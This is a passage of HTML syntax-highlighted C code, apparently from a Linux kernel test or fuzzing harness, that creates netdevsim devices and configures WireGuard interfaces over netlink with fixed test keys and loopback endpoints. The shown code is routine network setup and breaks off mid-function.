<span class="w">                 </span><span class="n">netdev_index</span><span class="p">);</span>
<span class="w">        </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg2</span><span class="p">,</span><span class="w"> </span><span class="n">rtsock</span><span class="p">,</span><span class="w"> </span><span class="n">port_name</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">                              </span><span class="n">netdev_name</span><span class="p">);</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
<span class="w">    </span><span class="n">netdev_index</span><span class="o">++</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="nl">error</span><span class="p">:</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">rtsock</span><span class="p">);</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define DEV_IPV4 &quot;172.20.20.%d&quot;</span>
<span class="cp">#define DEV_IPV6 &quot;fe80::%02x&quot;</span>
<span class="cp">#define DEV_MAC 0x00aaaaaaaaaa</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netdevsim_add</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">port_count</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">write_file</span><span class="p">(</span><span class="s">&quot;/sys/bus/netdevsim/del_device&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%u&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">write_file</span><span class="p">(</span><span class="s">&quot;/sys/bus/netdevsim/new_device&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%u %u&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">port_count</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;netdevsim%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="n">initialize_devlink_ports</span><span class="p">(</span><span class="s">&quot;netdevsim&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;netdevsim&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="cp">#define WG_GENL_NAME &quot;wireguard&quot;</span>
<span class="k">enum</span><span class="w"> </span><span class="nc">wg_cmd</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">WG_CMD_GET_DEVICE</span><span class="p">,</span>
<span class="w">  </span><span class="n">WG_CMD_SET_DEVICE</span><span class="p">,</span>
<span class="p">};</span>
<span class="k">enum</span><span class="w"> </span><span class="nc">wgdevice_attribute</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">WGDEVICE_A_UNSPEC</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_IFINDEX</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_IFNAME</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_PRIVATE_KEY</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_PUBLIC_KEY</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_FLAGS</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_LISTEN_PORT</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_FWMARK</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGDEVICE_A_PEERS</span><span class="p">,</span>
<span class="p">};</span>
<span class="k">enum</span><span class="w"> </span><span class="nc">wgpeer_attribute</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">WGPEER_A_UNSPEC</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_PRESHARED_KEY</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_FLAGS</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_LAST_HANDSHAKE_TIME</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_RX_BYTES</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_TX_BYTES</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGPEER_A_PROTOCOL_VERSION</span><span class="p">,</span>
<span class="p">};</span>
<span class="k">enum</span><span class="w"> </span><span class="nc">wgallowedip_attribute</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">WGALLOWEDIP_A_UNSPEC</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span>
<span class="w">  </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_wireguard_setup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">ifname_a</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;wg0&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">ifname_b</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;wg1&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">ifname_c</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;wg2&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">private_a</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xa0\x5c\xa8\x4f\x6c\x9c\x8e\x38\x53\xe2\xfd\x7a\x70\xae\x0f\xb2\x0f\xa1</span><span class="s">&quot;</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\x52\x60\x0c\xb0\x08\x45\x17\x4f\x08\x07\x6f\x8d\x78\x43</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">private_b</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xb0\x80\x73\xe8\xd4\x4e\x91\xe3\xda\x92\x2c\x22\x43\x82\x44\xbb\x88\x5c</span><span class="s">&quot;</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\x69\xe2\x69\xc8\xe9\xd8\x35\xb1\x14\x29\x3a\x4d\xdc\x6e</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">private_c</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xa0\xcb\x87\x9a\x47\xf5\xbc\x64\x4c\x0e\x69\x3f\xa6\xd0\x31\xc7\x4a\x15</span><span class="s">&quot;</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\x53\xb6\xe9\x01\xb9\xff\x2f\x51\x8c\x78\x04\x2f\xb5\x42</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">public_a</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\x97\x5c\x9d\x81\xc9\x83\xc8\x20\x9e\xe7\x81\x25\x4b\x89\x9f\x8e\xd9\x25</span><span class="s">&quot;</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xae\x9f\x09\x23\xc2\x3c\x62\xf5\x3c\x57\xcd\xbf\x69\x1c</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">public_b</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xd1\x73\x28\x99\xf6\x11\xcd\x89\x94\x03\x4d\x7f\x41\x3d\xc9\x57\x63\x0e</span><span class="s">&quot;</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\x54\x93\xc2\x85\xac\xa4\x00\x65\xcb\x63\x11\xbe\x69\x6b</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">public_c</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xf4\x4d\xa3\x67\xa8\x8e\xe6\x56\x4f\x02\x02\x11\x45\x67\x27\x08\x2f\x5c</span><span class="s">&quot;</span>
<span class="w">      </span><span class="s">&quot;</span><span class="se">\xeb\xee\x8b\x1b\xf5\xeb\x73\x37\x34\x1b\x45\x9b\x39\x22</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">listen_a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20001</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">listen_b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20002</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">listen_c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20003</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">af_inet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">af_inet6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET6</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">endpoint_b_v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">,</span>
<span class="w">      </span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">listen_b</span><span class="p">),</span>
<span class="w">      </span><span class="p">.</span><span class="n">sin_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_LOOPBACK</span><span class="p">)}};</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">endpoint_c_v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">,</span>
<span class="w">      </span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">listen_c</span><span class="p">),</span>
<span class="w">      </span><span class="p">.</span><span class="n">sin_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_LOOPBACK</span><span class="p">)}};</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in6</span><span class="w"> </span><span class="n">endpoint_a_v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{.</span><span class="n">sin6_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET6</span><span class="p">,</span>
<span class="w">                                       </span><span class="p">.</span><span class="n">sin6_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">listen_a</span><span class="p">)};</span>
<span class="w">  </span><span class="n">endpoint_a_v6</span><span class="p">.</span><span class="n">sin6_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in6addr_loopback</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in6</span><span class="w"> </span><span class="n">endpoint_c_v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{.</span><span class="n">sin6_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET6</span><span class="p">,</span>
<span class="w">                                       </span><span class="p">.</span><span class="n">sin6_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">listen_c</span><span class="p">)};</span>
<span class="w">  </span><span class="n">endpoint_c_v6</span><span class="p">.</span><span class="n">sin6_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in6addr_loopback</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">in_addr</span><span class="w"> </span><span class="n">first_half_v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">in_addr</span><span class="w"> </span><span class="n">second_half_v4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">htonl</span><span class="p">(</span><span class="mi">128</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">24</span><span class="p">)};</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">in6_addr</span><span class="w"> </span><span class="n">first_half_v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{{{</span><span class="mi">0</span><span class="p">}}};</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">in6_addr</span><span class="w"> </span><span class="n">second_half_v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{{{</span><span class="mh">0x80</span><span class="p">}}};</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">half_cidr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">persistent_keepalives</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">,</span><span class="w"> </span><span class="mi">14</span><span class="p">,</span><span class="w"> </span><span class="mi">19</span><span class="p">};</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">genlmsghdr</span><span class="w"> </span><span class="n">genlhdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{.</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WG_CMD_SET_DEVICE</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">};</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
<span class="w">  </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_GENERIC</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_query_family_id</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">WG_GENL_NAME</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">error</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_IFNAME</span><span class="p">,</span><span class="w"> </span><span class="n">ifname_a</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">ifname_a</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_PRIVATE_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">private_a</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_LISTEN_PORT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">listen_a</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGDEVICE_A_PEERS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">public_b</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">endpoint_b_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">endpoint_b_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">               </span><span class="o">&amp;</span><span class="n">persistent_keepalives</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">first_half_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">first_half_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">first_half_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">first_half_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">public_c</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">endpoint_c_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">endpoint_c_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">               </span><span class="o">&amp;</span><span class="n">persistent_keepalives</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">second_half_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">second_half_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
